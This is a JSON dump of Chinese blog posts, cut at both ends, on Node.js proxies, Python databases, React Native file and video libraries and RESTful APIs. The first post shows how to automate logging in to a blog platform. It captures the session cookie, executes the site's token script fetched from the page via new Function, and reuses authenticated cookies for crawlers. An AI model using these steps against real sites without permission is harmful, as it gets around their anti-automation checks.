外，其他国内的博客平台都没有提供对应的接口，但总有办法的。下面是我对某家博客平台模拟登录流程的记录（打死我都不会说这家平台是 segmentfault），个人觉得挺有意思的，也能从中学到不少产品安全设计的思路。","text":"前言 给自己定下写文章的目标后，就去找了几家博客平台来发布文章；作为一个懒人，不能所有博客文章都手动去各家平台发布，只好通过编写脚本来发布。但是除了Github提供了比较详细的 Api 外，其他国内的博客平台都没有提供对应的接口，但总有办法的。下面是我对某家博客平台模拟登录流程的记录（打死我都不会说这家平台是 segmentfault），个人觉得挺有意思的，也能从中学到不少产品安全设计的思路。 内容略修改，转载至：https://github.com/zwhu/blog/issues/7 装备工具： Babel （支持现代化 javascript 语法） Cheerio （html 解析器） SuperAgent （可换成 fetch, axios, request 这些） Chrome （浏览器） 注：工具只是实现结果的一个手段，并不一定需要掌握这些工具，只要知道它们是干嘛的就行了。 开始分析先进入主页找到用户登录页，如下图所示： 标准的登录框，在这边需要把 Chrome 的控制台打开，进入 Network 页，把 Preserve log （页面跳转也能记录日志）的选项勾中， 如下图所示： 正确登录一次抓包分析请求，先从输入正确密码开始，输入正确密码，正确请求一次后： 我把暴露隐私的两个地方打码了（这两块也是我们接下来要着重要分析的点），可以从中看到请求头，我们先把这些请求头照抄下来（最好不要漏项）： 1234567891011121314const base_headers = &#123; Accept: '*/*', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,ja;q=0.2', 'Cache-Control':'no-cache', Connection:'keep-alive', DNT:1, Host:'segmentfault.com', Origin: 'http://segmentfault.com', Pragma:'no-cache', Referer: 'http://segmentfault.com/', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36', 'X-Requested-With': 'XMLHttpRequest'&#125; 排除法去除无用的 Cookie我们可以看到在请求登录的时候 Header 就已经带有 Cookie 了，这在我平常的设计中没有做过，所以我就试着把 Cookie 删后再请求，看看有什么效果（其他域名的不用管）。删除 Cookie 的方法如下所示： 利用排除法不停删除并继续试着登录，都能完成登录；直到删除 PHPSESSID 的时候发现删除之后再登陆是会报错的，所以这个 PHPSESSID 肯定是有用的（而且每次刷新都不同，应该用来防 crsf 的），因此我断定这个 Cookie 是在后端作为验证登录的一个字段；因此我可以通过在登录之前先下载首页并拿到 Cookie，放到请求头上做作为模拟 Header。 获取初始的 Cookie1234567import request from 'superagent';let cookie;req.get(urls.mainpage).end((err, res) =&gt; &#123; // 从上图可以看到我们需要的cookie是PHPSESSID开头的 cookie = res.headers['set-cookie'].join(',').match(/(PHPSESSID=.+?);/)[1];&#125;); 获取页面的 token本以为拿到 Cookie 之后就可以开开心心的做登录请求，然而这么简单的话这篇文章页也就没什么写的必要了。继续分析请求 HTTP 包，可以发现在每次请求的时候，url 后面总是会带一个 queryString（图 2），我在这里耗费了不少时间，毫无头绪，只能追进源码里面摸索。 可以看到这个源码是被压缩过的，不要着急，chrome 提供了 formatt 功能，点击最下面的{}，可以对压缩的代码重排，至少是勉强可以阅读的代码了。 接下来的事情就是怎么从这堆代码中抽丝剥茧找到对我们有用的信息，可是这么多的代码一步步看下来也会看到头晕脑胀，眼睛滴血。那么就试试看能不能使用查找的方式从源码中找到我需要的东西。使用快捷键 ctrl+F，键入 /login （/login是作为登录的链接的，感觉上可能会有很大概率能搜到相关代码） 很巧的是，搜到了相关的代码。从中可以看到此网站使用了 JQuery 的 Ajax 发送相关 HTTP 请求，那么，url 便是 e.attr(“action”)，从下面的 DOM 结构能看到 action 是 api/user/login。 还是没有找到 queryString, 那就换个关键词试试看，这次搜索 _=（看图 2，queryString 是由 _= 拼接起来的） 从上图可以看到有 7 个结果，而被黄色标注出来的那行才是我们想要的。JQ 的 ajaxSend 可以在 Ajax 发送之前做一些处理。从上图可以看出，请求的时候在 url 的后面增加一个 n._ ，那就继续去找n._是什么？由于截图截少了，我就不再重新截图，从上图的第一行可以看到 _ 是 window.SF.token，由此我们就摸到 token 的 G 点，整个流程明朗了许多。接下来全局搜索window.SF.token，没找到。我知道 window 是全局变量，为什么把 token 放到 window 上？可以想多的是 token 并没有在当前的 script 标签内。接下来去 index.html 内查找： 1234567891011121314151617&lt;!Doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;&lt;/div&gt; &lt;script&gt; (function (w) &#123; w.SF.token = (function () &#123; // .... // 生成token return token; &#125;)();; &#125;)(window); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 找到了！可以看到 token 是被包裹在一个独立的 script 标签内，在后端生成 HTML 模板的时候就已经插入。找到 token 之后就很简单了，拿到这个字符串表达式，运行，拿到 token。 123456789101112131415161718192021import cheerio from 'cheerio';import request from 'superagent';let cookie;// 为什么这样做function getToken(s) &#123; let $ = cheerio.load(s), text = $('body script').eq(2).text(), fn = new Function('window', text + ';return window.SF.token'), token = fn(&#123;&#125;); return token;&#125;req.get(urls.mainpage).end((err, res) =&gt; &#123; let token = getToken(res.text) // 从上图可以看到我们需要的cookie是PHPSESSID开头的 cookie = res.headers['set-cookie'].join(',').match(/(PHPSESSID=.+?);/)[1]&#125;) 上面为什么要这样做呢： 在此处的情景中用 eval 也是挺不错的选择，但是某书上写着eval 是魔鬼那时我就被吓着呢，那我们就换成 new Function 来做。 看下 new Function 的用法如下： 1new Function ([arg1[, arg2[, ...argN]],] functionBody) new Function 会返回一个函数。例如 fn = new Function(‘a’, ‘b’, ‘return a + b’) 会返回一个函数对象，等效于下面的语法： 123const fn = function(a, b) &#123; return a + b&#125; so，我们可以使用 new Function 构造一个函数，用来执行获取到得表达式，并返回 token。 12const fn = new Function('window', functionBody + ';return window.token');console.log(fn(&#123;&#125;)); 构造的这个函数有个 window 形参，作为函数体中立即执行表达式的实参传入最内层的函数中。所以在最后执行的时候 return window.token 便会获得 token 的内容。 开始登录吧拿到 token 和 Cookie ，抓包分析所需要的登录字段: 12345&#123; mail: 'xxxxx@xx.xx', // 邮箱 password: 'xxxxxxx', // 密码 remember: '1' // 是否记住登录&#125; 模拟登录： 12345678910111213141516req.get(urls.mainpage).end((err, res) =&gt; &#123; let token = getToken(res.text); cookie = res.headers['set-cookie'].join(',').match(/(PHPSESSID=.+?);/)[1]; req .post(urls.login) .query(&#123;'_': token&#125;) .set(base_headers) .set('Cookie', cookie) .type('form') .send(conf) .redirects(0) .end((err, res) =&gt; &#123; console.log(res) &#125;)&#125;);&#125;); 总结 世上无难事只怕有心人 登录是最基础也最核心的功能，通过对登录流程的分析，基本弄清楚了此博客平台的验证机制，在分析的过程中斗智斗勇，利用自己掌握的知识一步一步破解谜题的本身就是一件很有意思的事情，以后也可以将此方法用到自己的登录流程设计中。登录之后能施展的手段就很多了: 提问题，发表文章，创建标签等等，用到得知识都在上面说过了，按下不表。 补充：说一点，对于在浏览器上生成 token，一定要在函数里判断一下当前是否具有浏览器的环境特征才给予生成，比如 document 对象特征，这样上面的 getToken 就跑不了了。当然，可能有大神会说，我给你模拟一个浏览器环境，这个我就没招了。 还有对于现在很多网站都有长期保存 cookie 来维持长久登录状态的，我们可以直接手动登录一次后，把认证后的 cookie 信息拿来用给爬虫用，这样就可以省去模拟登录的部分。","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/categories/爬虫/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/tags/爬虫/"}]},{"title":"Python 在数据持久化方面的知识","slug":"Python/Python 在数据持久化方面的知识","date":"2017-07-31T08:30:05.000Z","updated":"2021-06-15T06:10:52.851Z","comments":true,"path":"/stories/2017/07/Python/Python 在数据持久化方面的知识/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/Python/Python 在数据持久化方面的知识/","excerpt":"Redisredis 是一个 key-value 存储系统。它支持存储的 value 类型相对更多，包括 string、list、set、zset 和 hash。这些数据类型都支持 push/pop、add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。","text":"Redisredis 是一个 key-value 存储系统。它支持存储的 value 类型相对更多，包括 string、list、set、zset 和 hash。这些数据类型都支持 push/pop、add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。 在 python 上使用 redis 直接可以使用 redis 库。 安装： 1pip install redis 基本使用： 123456import redispool = redis.ConnectionPool(host='192.168.0.110', port=6379)r = redis.Redis(connection_pool=pool)r.set('name', 'zhangsan')print (r.get('name')) 剩下的操作基本和原生的 redis 操作差不多。 MongoDBMongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。其次 MongoDB 是一个 NOSQL，与 Mysql 这些 SQL 数据库有着不一样的地方。 PyMongo 是一个 MongoDB 在 Python 上的官方驱动，可以让你使用简洁的语法来操作 Mongodb 数据库。 安装： 1pip install pymongo 基本使用： 1234567891011121314151617181920212223242526272829import pymongoclient = pymongo.MongoClient('mongodb://localhost:27017/')db = client.lives # 选择数据库for item in db.test.find(): # 集合查询 print(item)db.test.find_one(&#123; 'title': &#123;'$regex': '^活动'&#125; &#125;) # 查询一个db.test.insert(&#123; 'name': '小明' &#125;) # 插入一个db.test.insert([ # 插入多个 &#123; 'name': '小明' &#125;, &#123; 'name': '小美' &#125;,]); # 更新db.test.update(&#123; 'name': '小明' &#125;, &#123; '$set': &#123; 'name': '新小明' &#125; &#125;)db.test.remove(&#123; 'name': '小明' &#125;) # 删除# 使用 _id 查询需要 BSONfrom bson.objectid import ObjectIddb.test.find_one(&#123;'_id': ObjectId('593278c115c2602667ec6bae')&#125;)# 链式使用db.test .find() .sort('name', pymongo.ASCENDING) .skip(10) .limit(10) 更多的参考文档，API 基本与 Nodejs 的差不多，只是峰坨式变成了下划线。 有点不同的是在 Python 里可以灵活利用数组切片来处理结果数组。 参考资料 http://api.mongodb.com/python/current/api/pymongo/","categories":[{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/categories/Python/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"}]},{"title":"Nodejs 代理服务","slug":"Nodejs/Nodejs 代理服务","date":"2017-07-29T01:51:34.000Z","updated":"2021-06-15T06:10:52.837Z","comments":true,"path":"/stories/2017/07/Nodejs/Nodejs 代理服务/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/Nodejs/Nodejs 代理服务/","excerpt":"正向代理正向代理通常叫代理，意思是一个位于客户端和原始服务器（origin server）之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标（原始服务器），然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。","text":"正向代理正向代理通常叫代理，意思是一个位于客户端和原始服务器（origin server）之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标（原始服务器），然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。 通俗点说： A 同学在大众创业、万众创新的大时代背景下开启他的创业之路，目前他遇到的最大的一个问题就是启动资金，于是他决定去找马云爸爸借钱，可想而知，最后碰一鼻子灰回来了，情急之下，他想到一个办法，找关系开后门，经过一番消息打探，原来 A 同学的大学老师王老师是马云的同学，于是 A 同学找到王老师，托王老师帮忙去马云那借 500 万过来，当然最后事成了。不过马云并不知道这钱是 A 同学借的，马云是借给王老师的，最后由王老师转交给 A 同学。这里的王老师在这个过程中扮演了一个非常关键的角色，就是代理，也可以说是正向代理，王老师代替 A 同学办这件事，这个过程中，真正借钱的人是谁，马云是不知道的，这点非常关键。 我们常说的代理也就是只正向代理，正向代理的过程，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求，某些科学上网工具扮演的就是典型的正向代理角色。 有时候在前端，想要调用别人的 API，却因为同源限制而使用不了。这时可以做一个正向代理来解决这个问题。 比如想要在前端里显示知乎日报的数据，但是这是不可能的，在浏览器上会存在同源限制，不同域名的资源是不能访问的，除非开启的允许跨域请求的功能。 同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。所谓同源是指，域名，协议，端口相同。 那么就下面通过使用 Nodejs 编写一个正向代理服务，代理《知乎日报 App API》，解决上述问题。 好，先是通过抓包，获取几个 API： 作用 API 日报主题类型 http://news-at.zhihu.com/api/4/themes 日报主题列表 http://news-at.zhihu.com/api/4/theme/13 最新文章列表（首页） http://news-at.zhihu.com/api/4/stories/latest 1234567891011121314151617181920const http = require('http');const fetch = require('node-fetch');const proxy = http.createServer((request, response) =&gt; &#123; response.setHeader('Content-Type', 'application/json;charset=utf-8;text/plain'); fetch('http://news-at.zhihu.com' + request.url, &#123; method: request.method, headers: &#123; 'Content-Type': 'application/json' &#125;, &#125;) .then(res =&gt; res.body.pipe(response)) .catch(err =&gt; &#123; console.error('Error:', err); &#125;);&#125;);proxy.listen(3000, () =&gt; &#123; console.log('\\n\\tserver run in 3000\\n');&#125;); 嘻嘻，成功代理后，API 就变成了： 作用 API 日报主题类型 http://127.0.0.1:3000/api/4/themes 日报主题列表 http://127.0.0.1:3000/api/4/theme/13 最新文章列表（首页） http://127.0.0.1:3000/api/4/stories/latest 等等，那么同源限制，怎么办？ 在 Nodejs 上开启cors 跨域，允许跨域请求。 1234response.setHeader(\"Access-Control-Allow-Origin\", \"*\");response.setHeader(\"Access-Control-Allow-Headers\", \"Origin, X-Requested-With, Content-Type, Accept\");response.setHeader(\"Access-Control-Allow-Methods\", \"PUT,POST,GET,DELETE,OPTIONS\");response.setHeader(\"Content-Type\", \"application/json;charset=utf-8;text/plain\"); 或者使用 nodejs 的 cors 库：https://github.com/expressjs/cors 这样就可以在前端里使用《知乎日报 App API》搞点事情了，是不是很爽？ 补充：pipe对 pipe 的知识补充说明。 pipe() 是一个流 API，顾名思义就是类似 Linux 管道的用法。readable.pipe() 绑定一个 Writable 到 readable 上， 将可写流自动切换到 flowing 模式并将所有数据传给绑定的 Writable。数据流将被自动管理。这样，即使是可读流较快，目标可写流也不会超负荷（overwhelmed）。 readable.pipe() 方法返回 目标流 的引用，这样就可以对流进行链式地管道操作： 1234const r = fs.createReadStream('file.txt'); // 创建一个可读流const z = zlib.createGzip(); // 使用 gzip 算法const w = fs.createWriteStream('file.txt.gz'); // 创建一个可写流r.pipe(z).pipe(w); // 读流 -&gt; gzip -&gt; 写流 上面的这段代码，先是创建一个可读流用流的方式读文件，接着使用一个 gzip 算法对文件进行压缩，然后创建一个可写流用流的方式写文件，最后通过 pipe 来连接所有的流（stream）。 在其中，一气呵成，不需要太多的代码量，这就是流（stream）的魅力所在。 反向代理反向代理（Reverse Proxy）方式是指以代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 通俗点说： 大家都有过这样的经历，拨打 10086 客服电话，可能一个地区的 10086 客服有几个或者几十个，你永远都不需要关心在电话那头的是哪一个，叫什么，男的，还是女的，漂亮的还是帅气的，你都不关心，你关心的是你的问题能不能得到专业的解答，你只需要拨通了 10086 的总机号码，电话那头总会有人会回答你，只是有时慢有时快而已。那么这里的 10086 总机号码就是我们说的反向代理，。客户不知道真正提供服务人的是谁。 假设，现在我有一台 VPS 主机来托管运行 Web 项目，里面部署着不同的服务程序，包括 HTTP，WebSocket 等协议。现在有四个 Nodejs 应用，分别监听 3000, 3001, 3002, 3003 端口。 默认情况下，对外开放的是80端口，为了安全性，其他自定义的端口都会被防火墙防住。在这种情况下，要如何才能让外面访问 3000 端口？最简单粗暴的方式就是，让防火墙开启 3000 端口对外访问，但这是一种非常不安全的做法。 那么就应该使用反向代理，来解决问题。 每当提起反向代理器，人们通常一想到的就是Nginx，但是今天我们暂时忽略大名鼎鼎的 Nginx，采用同样也是使用单线程、事件循环的服务端大佬 —— Nodejs 来达成。 Nodejs 没有自带反向代理的模块，说以需要第三方支持。先是安装一个反向代理的模块： 1npm install --save http-proxy 下面的代码进行各种的反向代理： 123456789101112131415161718192021222324252627282930313233343536373839404142const http = require('http');const httpProxy = require('http-proxy');// 新建一个代理 Proxy Server 对象const proxy = httpProxy.createProxyServer(&#123;&#125;);// 捕获错误proxy.on('error', (err, req, res) =&gt; &#123; console.error('Error:', err); res.writeHead(500, &#123; 'Content-Type': 'text/plain' &#125;); res.end('发生了错误');&#125;);// 另外新建一个 HTTP 80 端口的服务器，也就是常规 Node 创建 HTTP 服务器的方法。// 在每次请求中，调用 proxy.web(req, res config) 方法进行请求分发const server = http.createServer((req, res) =&gt; &#123; // 在这里可以自定义你的路由分发 let host = req.headers.host, ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress; console.log('client ip:', ip, 'host:', host); switch (host) &#123; case 'a.com': case 'bbs.a.com': return proxy.web(req, res, &#123; target: 'http://127.0.0.1:3000' &#125;); case 'b.com': return proxy.web(req, res, &#123; target: 'http://127.0.0.1:3001' &#125;); case 'c.com': case 'www.c.com': return proxy.web(req, res, &#123; target: 'http://127.0.0.1:3002' &#125;); case 'd.cn': return proxy.web(req, res, &#123; target: 'http://127.0.0.1:3003' &#125;); default: res.writeHead(200, &#123; 'Content-Type': 'text/plain' &#125;); res.end('Welcome to my server!'); &#125;&#125;);server.listen(80, () =&gt; &#123; console.log('\\n\\tserver run in 3000\\n');&#125;); 这样就完成了一个反向代理。 除此之外，还可以利用 node-http-proxy 做负载均衡、Websocket （使用 proxy.ws() 语法）等相关的工作。 123456789101112switch (host) &#123; case 'd.com': case 'www.d.com': if (req.url.indexOf('/grand') != -1) &#123; proxy.web(req, res, &#123; target: 'http://127.0.0.1:3004' &#125;); &#125; else &#123; proxy.web(req, res, &#123; target: 'http://127.0.0.1:3005' &#125;); &#125; break; default: return;&#125; 上面的代码，把/grand 路由下的所有请求都代理到 3004 端口上。 参考资料 http://nodejs.cn/api/stream.html#stream_readable_pipe_destination_options https://github.com/nodejitsu/node-http-proxy","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"React Native 文件操作 - fs","slug":"React Native/IO/React Native 文件操作 - fs","date":"2017-07-28T01:44:46.000Z","updated":"2021-06-15T06:10:52.854Z","comments":true,"path":"/stories/2017/07/React Native/IO/React Native 文件操作 - fs/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/React Native/IO/React Native 文件操作 - fs/","excerpt":"文件操作我想实现保存图片到本地相册的功能，然而 React Native 自带的 API 实现不了，包括CameraRoll也不行。无赖，在只能使用第三方组件。对文件操作相关的目前有两个比较好的组件： react-native-fs 和 react-native-fetch-blob，它们都有对本地文件操作的 API。下面，介绍 react-native-fs 的集成与使用，它有着与 Nodejs 文件操作类似的 API 设计。","text":"文件操作我想实现保存图片到本地相册的功能，然而 React Native 自带的 API 实现不了，包括CameraRoll也不行。无赖，在只能使用第三方组件。对文件操作相关的目前有两个比较好的组件： react-native-fs 和 react-native-fetch-blob，它们都有对本地文件操作的 API。下面，介绍 react-native-fs 的集成与使用，它有着与 Nodejs 文件操作类似的 API 设计。 react-native-fs安装： 12npm install --save react-native-fsreact-native link react-native-fs 基本使用react-native-fs的 API 全部返回Promise对象，下面的示例，使用 rnfs 来读取某个文件夹。 1234567891011121314151617181920212223242526import RNFS from 'react-native-fs';// 在 Android 上请使用 RNFS.DocumentDirectoryPath// （MainBundlePath 没有定义），在 IOS 上没有这样坑RNFS.readDir(RNFS.DocumentDirectoryPath) .then((result) =&gt; &#123; // /data/data/com.test/files console.log('GOT RESULT', result); // 检查并返回文件夹里的第一个文件路径 return Promise.all([RNFS.stat(result[0].path), result[0].path]); &#125;) .then((statResult) =&gt; &#123; if (statResult[0].isFile()) &#123; // 如果是文件（而不是文件夹），就读取它的内容 return RNFS.readFile(statResult[1], 'utf8'); &#125; return 'no file'; &#125;) .then((contents) =&gt; &#123; // 输出文件内容 console.log(contents); &#125;) .catch((err) =&gt; &#123; // 捕捉错误信息 console.log(err.message, err.code); &#125;); 文件创建下面的示例，实现文件的创建。 1234567891011// DocumentDirectoryPath 在 Android 上位于应用程序的 files 目录。const path = RNFS.DocumentDirectoryPath + '/test.txt';// 写文件，写入内容RNFS.writeFile(path, 'Lorem ipsum dolor sit amet', 'utf8') .then((success) =&gt; &#123; console.log('FILE WRITTEN!'); &#125;) .catch((err) =&gt; &#123; console.log(err.message); &#125;); 文件删除1234567RNFS.unlink(path).then(() =&gt; &#123; console.log('FILE DELETED'); &#125;) // `unlink` will throw an error, if the item to unlink does not exist .catch((err) =&gt; &#123; console.log(err.message); &#125;); 常量以下常量可用于RNFS导出： MainBundlePath （主包目录的绝对路径） CachesDirectoryPath （缓存目录的绝对路径） DocumentDirectoryPath （文档目录的绝对路径） TemporaryDirectoryPath （临时目录的绝对路径，仅限 iOS） LibraryDirectoryPath （NSLibraryDirectory 的绝对路径，仅限 iOS） ExternalDirectoryPath （绝对路径到外部文件，共享目录，仅限 android） ExternalStorageDirectoryPath （绝对路径到外部存储，共享目录，仅限 android） APIAPI 的作用，根据英文名称去推断。 API 说明 readDir(dirpath: string):Promise&lt;ReadDirItem[]&gt; readDirAssets(dirpath: string):Promise&lt;ReadDirItem[]&gt; Android readdir(dirpath: string):Promise&lt;string[]&gt; stat(filepath: string):Promise&lt;StatResult&gt; readFile(filepath: string, encoding?: string):Promise&lt;string&gt; read(filepath: string, length = 0, position = 0, encodingOrOptions?: any):Promise&lt;string&gt; readFileAssets(filepath:string, encoding?: string):Promise&lt;string&gt; Android writeFile(filepath: string, contents: string, encoding?: string):Promise&lt;void&gt; appendFile(filepath: string, contents: string, encoding?: string):Promise&lt;void&gt; write(filepath: string, contents: string, position?: number, encoding?: string):Promise&lt;void&gt; moveFile(filepath: string, destPath: string):Promise&lt;void&gt; copyFile(filepath: string, destPath: string):Promise&lt;void&gt; copyFileAssets(filepath: string, destPath: string):Promise&lt;void&gt; Android unlink(filepath: string):Promise&lt;void&gt; exists(filepath: string): Promise&lt;boolean&gt; existsAssets(filepath: string):Promise&lt;boolean&gt; hash(filepath: string, algorithm: string):Promise&lt;string&gt; touch(filepath: string, mtime?: Date, ctime?: Date):Promise&lt;string&gt; 设置修改时间 mkdir(filepath: string, options?: MkdirOptions):Promise&lt;void&gt; downloadFile(options: DownloadFileOptions): { jobId: number, promise:Promise&lt;DownloadResult&gt; } 根据 url 下载文件 stopDownload(jobId: number): void uploadFiles(options: UploadFileOptions): { jobId: number, promise:Promise&lt;UploadResult&gt; } IOS stopUpload(jobId: number):Promise&lt;void&gt; IOS getFSInfo():Promise&lt;FSInfoResult&gt; IOS pathForGroup(groupIdentifier: string):Promise&lt;string&gt; IOS 实现保存图片功能如果希望有这样一个功能，在用户点击按钮时，把图片保存在本地的磁盘里。要实现，保存图片功能，使用的是 downloadFile API。先看看它的配置项与返回结果： 1234567891011121314151617type DownloadFileOptions = &#123; fromUrl: string; // 下载的 url toFile: string; // 保存的本地文件路径 headers?: Headers; // 请求头 background?: boolean; progressDivider?: number; begin?: (res: DownloadBeginCallbackResult) =&gt; void; progress?: (res: DownloadProgressCallbackResult) =&gt; void; connectionTimeout?: number // 仅限 Android readTimeout?: number // 仅限 Android&#125;;type DownloadResult = &#123; jobId: number; // 文件的 jobId，如果希望取消下载，则需要 jobId statusCode: number; // http 状态码 bytesWritten: number; // 写入文件的字节数&#125;; 如果提供 options.begin，它将在下载时被调用一次，当头已被接收并且传递具有以下属性的单个参数时： 123456type DownloadBeginCallbackResult = &#123; jobId: number; `. statusCode: number; // The HTTP status code contentLength: number; // The total size in bytes of the download resource headers: Headers; // The HTTP response headers from the server&#125;; 如果提供 options.progress，它将被连续调用，并传递一个参数，具有以下属性： 12345type DownloadProgressCallbackResult = &#123; jobId: number; contentLength: number; // The total size in bytes of the download resource bytesWritten: number; // The number of bytes written to the file so far&#125;; 如果提供 options.progressDivider，它将返回除以的进度事件progressDivider。 例如，如果 progressDivider= 10，您将仅获得十次回调函数调用，取值为进度：0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100 用于执行性能问题。如果 progressDivider= 0，您将收到所有 progressCallback 的回调，默认值为 0。 实践实现保存下面的图片到相册的位置： 123456789101112131415161718192021222324// 读取存储器的目录const res = await fs.readDir(fs.ExternalStorageDirectoryPath);// 查找 DCIM 文件（DCIM 一般指的是相册文件）const path = res.find(i =&gt; /\\/DCIM/g.test(i.path)).path;if(path !== undefined &amp;&amp; path.length &gt; 0) &#123; // 保存图片 fs.downloadFile(&#123; fromUrl: 'http://pic.7kk.com/upload/c/22/e4d4b27deb13380f6b05f9bba0432.jpg', toFile: path + '/meinv.jpg', progressDivider: 5, progress: (&#123; bytesWritten &#125;) =&gt; &#123; // ... 统计进度 &#125; &#125;).promise.then(res =&gt; &#123; console.warn(this.logs(res)); fs.readDir(path).then(res =&gt; &#123; console.warn(this.logs(res)); &#125;) &#125;).catch(err =&gt; &#123; console.error(this.logs(err)); &#125;);&#125; 运行后，在对应文件夹里，看到图片表示成功了。 如果想自定义一个目录文件，那么可以使用 mkdir API 来创建一个文件夹。 1await fs.mkdir(path + '/test'); 总结react-native-fs 能够很容易的提供操作本地文件的能力，有着类似 Nodejs fs 的 API。 但是还是有点不足： 不支持文件流模式 API 支持有限 不能操作外部存储器（SD 卡） 后面将尝试，使用react-native-fetch-blob实现同样的功能。 参考资料 https://github.com/itinance/react-native-fs","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"},{"name":"网络请求","slug":"网络请求","permalink":"http://me.lizhooh.com/tags/网络请求/"}]},{"title":"解决 react-native-video 加载视频阻塞 UI 线程的问题","slug":"React Native/Media/解决 react-native-video 加载视频阻塞 UI 线程的问题","date":"2017-07-27T11:38:47.000Z","updated":"2021-06-15T06:10:52.857Z","comments":true,"path":"/stories/2017/07/React Native/Media/解决 react-native-video 加载视频阻塞 UI 线程的问题/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/React Native/Media/解决 react-native-video 加载视频阻塞 UI 线程的问题/","excerpt":"之前react-native-video在之前，大概是 v0.9.0 版本，在 Android 上加载视频时会阻塞 UI 线程，导致整个画面冻结长达 3s - 10s 的时间，之后有人提出使用ExoPlayer来解决这个问题（v1.0 之后）。 参考： https://github.com/react-native-community/react-native-video/issues/555https://github.com/react-native-community/react-native-video/pull/426","text":"之前react-native-video在之前，大概是 v0.9.0 版本，在 Android 上加载视频时会阻塞 UI 线程，导致整个画面冻结长达 3s - 10s 的时间，之后有人提出使用ExoPlayer来解决这个问题（v1.0 之后）。 参考： https://github.com/react-native-community/react-native-video/issues/555https://github.com/react-native-community/react-native-video/pull/426 目前的解决方案是使用ExoPlayer： 更改android/settings.gradle 配置： 12- project(':react-native-video').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-video/android')+ project(':react-native-video').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-video/android-exoplayer') 使用： 12345678910111213141516171819import Video from 'react-native-video';&lt;Video source=&#123;&#123; uri: 'http://112.74.109.11/test.mp4', type: 'mp4' &#125;&#125; resizeMode=\"cover\" rate=&#123;1&#125; volume=&#123;1&#125; muted=&#123;false&#125; repeat=&#123;true&#125; paused=&#123;this.state.paused&#125; style=&#123;$.video&#125; onLoadStart=&#123;this.onLoadStart&#125; onLoad=&#123;this.onLoad&#125; onEnd=&#123;this.onEnd&#125; onError=&#123;this.videoError&#125; /&gt; 更新在 react-native-video v3.0.0 出现的问题，需要在 android/build.gradle 里添加代码： 1234567maven &#123; url 'https://maven.google.com'&#125;maven &#123; // All of React Native (JS, Obj-C sources, Android binaries) is installed from npm url \"$rootDir/../node_modules/react-native/android\"&#125;","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"今天来学习：RestFul API 设计","slug":"后端/今天来学习：RestFul API 设计","date":"2017-07-25T03:51:44.000Z","updated":"2021-06-15T06:10:52.910Z","comments":true,"path":"/stories/2017/07/后端/今天来学习：RestFul API 设计/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/后端/今天来学习：RestFul API 设计/","excerpt":"RestFulRestFul API 是目前比较成熟的一套互联网应用程序的 API 设计理论。REST 指的是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是 RESTful。 RestFul 架构： 每一个 URI 代表一种资源 客户端和服务器之间，传递这种资源的某种表现层 客户端通过四个 HTTP 动词，对服务器端资源进行操作，实现”表现层状态转化”","text":"RestFulRestFul API 是目前比较成熟的一套互联网应用程序的 API 设计理论。REST 指的是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是 